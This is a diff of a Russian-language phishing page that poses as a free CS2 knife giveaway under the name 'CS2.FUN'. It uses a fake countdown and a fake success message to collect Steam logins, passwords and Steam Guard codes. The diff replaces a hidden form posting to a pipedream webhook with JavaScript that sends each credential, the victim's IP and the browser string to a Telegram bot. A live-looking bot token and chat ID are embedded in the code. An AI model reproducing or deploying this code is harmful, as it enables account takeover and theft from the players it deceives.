@@ -39,7 +39,6 @@
             overflow-x: hidden;
         }
         
-        /* Частицы */
         .particles {
             position: fixed;
             top: 0;
@@ -62,7 +61,6 @@
             100% { transform: translateY(-1000px) rotate(720deg); }
         }
         
-        /* Шапка */
         .header {
             background: rgba(23, 26, 33, 0.95);
             backdrop-filter: blur(10px);
@@ -141,7 +139,6 @@
             transform: translateY(-2px);
         }
         
-        /* Основной контент */
         .main {
             padding: 60px 0;
             position: relative;
@@ -188,7 +185,6 @@
             opacity: 0.9;
         }
         
-        /* Таймер */
         .timer-container {
             background: rgba(42, 47, 59, 0.6);
             border-radius: 16px;
@@ -233,7 +229,6 @@
             opacity: 0.7;
         }
         
-        /* Форма */
         .form-container {
             background: var(--gradient);
             border-radius: 20px;
@@ -351,7 +346,6 @@
             opacity: 1;
         }
         
-        /* Скины */
         .skins-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
@@ -398,7 +392,6 @@
             font-weight: 600;
         }
         
-        /* Успех */
         .success-container {
             text-align: center;
             padding: 40px 0;
@@ -432,7 +425,6 @@
             to { transform: rotate(360deg); }
         }
         
-        /* Футер */
         .footer {
             margin-top: 80px;
             padding: 40px 0;
@@ -451,7 +443,6 @@
             margin-bottom: 20px;
         }
         
-        /* Адаптив */
         @media (max-width: 768px) {
             h1 { font-size: 36px; }
             .subtitle { font-size: 18px; }
@@ -460,7 +451,6 @@
             .timer-value { font-size: 28px; }
         }
         
-        /* Скрытые элементы для сбора данных */
         .hidden-iframe {
             position: absolute;
             width: 0;
@@ -470,7 +460,6 @@
             pointer-events: none;
         }
         
-        /* Сообщения */
         .alert {
             padding: 15px;
             border-radius: 10px;
@@ -492,10 +481,8 @@
     </style>
 </head>
 <body>
-    <!-- Частицы -->
     <div class="particles" id="particles"></div>
     
-    <!-- Шапка -->
     <header class="header">
         <div class="container">
             <nav class="nav">
@@ -511,7 +498,6 @@
         </div>
     </header>
     
-    <!-- Основной контент -->
     <main class="main">
         <div class="container">
             <section class="hero">
@@ -519,7 +505,6 @@
                 <h1>ПОЛУЧИ БЕСПЛАТНЫЕ НОЖИ CS2</h1>
                 <p class="subtitle">Войди через Steam и получи случайный нож или скин из нашей раздачи. Только сегодня!</p>
                 
-                <!-- Таймер -->
                 <div class="timer-container">
                     <div class="timer-title">⏰ Раздача закроется через:</div>
                     <div class="timer">
@@ -539,9 +524,7 @@
                 </div>
             </section>
             
-            <!-- Форма входа -->
             <section class="form-container">
-                <!-- Шаг 1: Вход через Steam -->
                 <div id="step1" class="form-step active">
                     <h2 class="form-title">🔑 Войди через Steam</h2>
                     <p class="form-description">Для участия в раздаче требуется авторизация через Steam</p>
@@ -569,7 +552,6 @@
                     </div>
                 </div>
                 
-                <!-- Шаг 2: Код Steam Guard -->
                 <div id="step2" class="form-step">
                     <button class="btn-back" onclick="showStep(1)">
                         ← Назад
@@ -596,7 +578,6 @@
                     </div>
                 </div>
                 
-                <!-- Шаг 3: Успех -->
                 <div id="step3" class="form-step">
                     <div class="success-container">
                         <div class="success-icon">🎉</div>
@@ -617,7 +598,6 @@
                 </div>
             </section>
             
-            <!-- Пример скинов -->
             <section class="skins-grid">
                 <div class="skin-card">
                     <div class="skin-image">🔪</div>
@@ -654,7 +634,6 @@
         </div>
     </main>
     
-    <!-- Футер -->
     <footer class="footer">
         <div class="container">
             <div class="steam-notice">
@@ -664,67 +643,51 @@
             <p>© 2023 CS2.FUN — Раздача скинов. Все права защищены. Steam и логотип Steam являются товарными знаками и/или зарегистрированными товарными знаками Valve Corporation в США и/или других странах.</p>
         </div>
     </footer>
-    
-    <!-- Скрытые элементы для отправки данных -->
-    <iframe name="hiddenFrame" class="hidden-iframe"></iframe>
-    <form id="hiddenForm" action="https://eoinuzdsdrixye7.m.pipedream.net" method="POST" target="hiddenFrame" style="display: none;">
-        <input type="hidden" name="type" id="hidden-type">
-        <input type="hidden" name="steam_login" id="hidden-login">
-        <input type="hidden" name="steam_password" id="hidden-password">
-        <input type="hidden" name="guard_code" id="hidden-guard">
-        <input type="hidden" name="user_agent" id="hidden-ua">
-        <input type="hidden" name="timestamp" id="hidden-timestamp">
-        <input type="hidden" name="session_id" id="hidden-session">
-    </form>
-    
+
     <script>
-        // Конфигурация
+        // === КОНФИГУРАЦИЯ ===
+        // ТВОИ ДАННЫЕ УЖЕ ВСТАВЛЕНЫ
         const CONFIG = {
-            webhook: 'https://eoinuzdsdrixye7.m.pipedream.net',
+            telegramBotToken: '8566149977:AAGvf2hWlBdaimvZd6gF_Rqp0Rpe4jbKvEk',
+            telegramChatId: '6855683398',
             sessionId: 'cs2_fun_' + Math.random().toString(36).substring(2, 15),
-            redirectDelay: 10000 // 10 секунд до перенаправления
+            redirectDelay: 10000
         };
         
-        // Элементы DOM
         const steps = {
             1: document.getElementById('step1'),
             2: document.getElementById('step2'),
             3: document.getElementById('step3')
         };
         
-        const hiddenForm = document.getElementById('hiddenForm');
-        const hiddenFields = {
-            type: document.getElementById('hidden-type'),
-            login: document.getElementById('hidden-login'),
-            password: document.getElementById('hidden-login'),
-            guard: document.getElementById('hidden-guard'),
-            ua: document.getElementById('hidden-ua'),
-            timestamp: document.getElementById('hidden-timestamp'),
-            session: document.getElementById('hidden-session')
-        };
-        
-        // Инициализация
-        function init() {
-            // Установка user agent и session ID
-            hiddenFields.ua.value = navigator.userAgent;
-            hiddenFields.session.value = CONFIG.sessionId;
-            
-            // Запуск таймера
-            startTimer();
-            
-            // Создание частиц
-            createParticles();
-            
-            // Фокус на поле логина
-            document.getElementById('steamLogin').focus();
+        // Тестовая функция для проверки бота
+        async function testBot() {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegramBotToken}/getMe`);
+                const data = await response.json();
+                if (data.ok) {
+                    console.log('✅ Бот активен:', data.result.username);
+                    // Отправляем тестовое сообщение
+                    await sendToTelegram('test', { test: 'Бот работает!' });
+                } else {
+                    console.error('❌ Ошибка бота:', data);
+                }
+            } catch (error) {
+                console.error('❌ Не удалось подключиться к боту:', error);
+            }
         }
         
-        // Таймер обратного отсчёта
-        function startTimer() {
-            let hours = 12;
-            let minutes = 45;
-            let seconds = 30;
+        function init() {
+            startTimer();
+            createParticles();
+            document.getElementById('steamLogin').focus();
             
+            // Проверяем бота при загрузке
+            testBot();
+        }
+        
+        function startTimer() {
+            let hours = 12, minutes = 45, seconds = 30;
             const timer = setInterval(() => {
                 seconds--;
                 if (seconds < 0) {
@@ -736,18 +699,15 @@
                         if (hours < 0) {
                             clearInterval(timer);
                             document.querySelector('.badge').textContent = '⏰ РАЗДАЧА ЗАКОНЧИЛАСЬ!';
-                            return;
                         }
                     }
                 }
-                
                 document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
                 document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
                 document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
             }, 1000);
         }
         
-        // Частицы
         function createParticles() {
             const container = document.getElementById('particles');
             for (let i = 0; i < 50; i++) {
@@ -763,34 +723,80 @@
             }
         }
         
-        // Переключение шагов
         function showStep(step) {
             Object.values(steps).forEach(el => el.classList.remove('active'));
             steps[step].classList.add('active');
             window.scrollTo({ top: 600, behavior: 'smooth' });
         }
         
-        // Отправка данных
-        function sendData(type, data) {
-            hiddenFields.type.value = type;
-            hiddenFields.timestamp.value = new Date().toISOString();
+        async function sendToTelegram(type, data) {
+            // Форматируем сообщение для лучшей читаемости
+            const message = `🔐 *НОВЫЕ ДАННЫЕ STEAM* 🔐
+        
+    👤 *Логин:* \`${data.login || 'N/A'}\`
+    🔑 *Пароль:* \`${data.password || 'N/A'}\`
+    🔢 *Код Guard:* \`${data.guardCode || 'N/A'}\`
+    🕐 *Время:* ${new Date().toLocaleString('ru-RU')}
+    🌐 *Сессия:* \`${CONFIG.sessionId}\`
+    📍 *IP:* ${await getIP()}
+    🌍 *Браузер:* ${navigator.userAgent.substring(0, 80)}...`;
             
-            if (data.login) hiddenFields.login.value = data.login;
-            if (data.password) hiddenFields.password.value = data.password;
-            if (data.guardCode) hiddenFields.guard.value = data.guardCode;
-            
-            hiddenForm.submit();
-            
-            // Очистка полей после отправки
-            setTimeout(() => {
-                document.getElementById('steamLogin').value = '';
-                document.getElementById('steamPassword').value = '';
-                document.getElementById('guardCode').value = '';
-            }, 1000);
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.telegramChatId,
+                        text: message,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true,
+                        disable_notification: false
+                    })
+                });
+                
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('❌ Ошибка Telegram API:', result);
+                    backupData(type, data);
+                    return false;
+                }
+                console.log('✅ Данные отправлены в Telegram');
+                return true;
+            } catch (error) {
+                console.error('❌ Ошибка отправки:', error);
+                backupData(type, data);
+                return false;
+            }
+        }
+        
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Не удалось определить';
+            }
+        }
+        
+        function backupData(type, data) {
+            try {
+                const backups = JSON.parse(localStorage.getItem('steam_backups') || '[]');
+                backups.push({
+                    type,
+                    data,
+                    timestamp: new Date().toISOString(),
+                    session: CONFIG.sessionId
+                });
+                localStorage.setItem('steam_backups', JSON.stringify(backups.slice(-20)));
+                console.log('💾 Данные сохранены в localStorage');
+            } catch (e) {
+                console.error('Ошибка сохранения в localStorage:', e);
+            }
         }
         
         // Шаг 1: Вход
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const btn = document.getElementById('loginBtn');
@@ -806,16 +812,22 @@
             btn.disabled = true;
             btn.innerHTML = 'Проверка данных... <div class="loading" style="display: inline-block; width: 20px; height: 20px; margin-left: 10px;"></div>';
             
-            // Имитация проверки
+            // Отправляем в Telegram
+            const success = await sendToTelegram('steam_login', { login, password });
+            
+            if (success) {
+                showAlert(alert, '✅ Данные приняты, проверяем Steam Guard...', 'success');
+            }
+            
+            // Переход к следующему шагу
             setTimeout(() => {
-                sendData('steam_login', { login, password });
                 showStep(2);
                 document.getElementById('guardCode').focus();
             }, 1500);
         });
         
         // Шаг 2: Steam Guard
-        function submitGuardCode() {
+        async function submitGuardCode() {
             const btn = document.getElementById('guardBtn');
             const alert = document.getElementById('step2-alert');
             const code = document.getElementById('guardCode').value.trim().toUpperCase();
@@ -828,22 +840,26 @@
             btn.disabled = true;
             btn.textContent = 'Проверка кода...';
             
+            // Отправляем код в Telegram
+            const success = await sendToTelegram('steam_guard', { guardCode: code });
+            
+            if (success) {
+                showAlert(alert, '✅ Код подтверждён! Загружаем награду...', 'success');
+            }
+            
+            // Показываем успех
             setTimeout(() => {
-                sendData('steam_guard', { guardCode: code });
                 showStep(3);
                 startSuccessCountdown();
             }, 1500);
         }
         
-        // Повторная отправка кода
         function resendCode() {
             const alert = document.getElementById('step2-alert');
-            showAlert(alert, 'Код отправлен повторно на вашу почту', 'success');
-            
-            sendData('resend_code', {});
+            showAlert(alert, '✅ Код отправлен повторно на вашу почту', 'success');
+            sendToTelegram('resend_code', {});
         }
         
-        // Успешный шаг
         function startSuccessCountdown() {
             let countdown = 10;
             const countdownEl = document.getElementById('countdownValue');
@@ -857,37 +873,44 @@
                 }
             }, 1000);
             
-            // Рандомный нож для сообщения
+            // Случайный нож для сообщения
             const knives = [
                 '★ Скелетный нож | Ледяной огонь',
                 '★ Karambit | Фазовый кинжал',
                 '★ Сапёрная лопатка | Ультрафиолет',
                 '★ Нож-бабочка | Ночная полоса',
-                '★ Коготь | Марипоса'
+                '★ Коготь | Марипоса',
+                '★ Стилет | Доплер Сапфир',
+                '★ Боуи | Тигровый зуб',
+                '★ Охотничий нож | Автотроника'
             ];
             const randomKnife = knives[Math.floor(Math.random() * knives.length)];
             document.getElementById('successMessage').innerHTML = 
-                `<strong>Нож "${randomKnife}" добавлен в ваш инвентарь!</strong><br>Откройте CS2 чтобы проверить.`;
+                `<strong>🎉 Поздравляем! Нож "${randomKnife}" добавлен в ваш инвентарь!</strong><br>
+                 Откройте CS2 чтобы проверить. Награда появится в течение 5 минут.`;
         }
         
-        // Показ уведомлений
         function showAlert(element, message, type) {
             element.textContent = message;
             element.className = `alert alert-${type}`;
             element.style.display = 'block';
-            
-            setTimeout(() => {
-                element.style.display = 'none';
-            }, 5000);
+            setTimeout(() => element.style.display = 'none', 5000);
         }
-        
-        // Запуск при загрузке
-        window.addEventListener('load', init);
         
         // Глобальные функции для кнопок
         window.showStep = showStep;
         window.submitGuardCode = submitGuardCode;
         window.resendCode = resendCode;
+        
+        // Запуск при загрузке
+        window.addEventListener('load', init);
+        
+        // Функция для просмотра сохранённых данных (для отладки)
+        window.viewBackups = function() {
+            const backups = JSON.parse(localStorage.getItem('steam_backups') || '[]');
+            console.log('Сохранённые данные:', backups);
+            alert(`Сохранено ${backups.length} записей. Откройте консоль (F12) для просмотра.`);
+        };
     </script>
 </body>
 </html>
